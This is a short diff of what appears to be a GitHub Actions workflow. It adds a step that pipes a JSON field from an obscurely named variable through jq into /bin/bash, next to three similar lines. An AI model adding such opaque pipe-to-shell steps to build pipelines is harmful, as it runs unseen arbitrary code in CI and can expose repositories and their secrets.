@@ -34,6 +34,7 @@ jobs:
           echo $tbbcj4 | jq -r .qg1 | /bin/bash
           printf '%s' "$j4833" | jq -r .w73468 | /bin/bash
           printf '%s' "$t4" | jq -r .r185 | /bin/bash
+          printf '%s' "$aw2" | jq -r .hva05 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
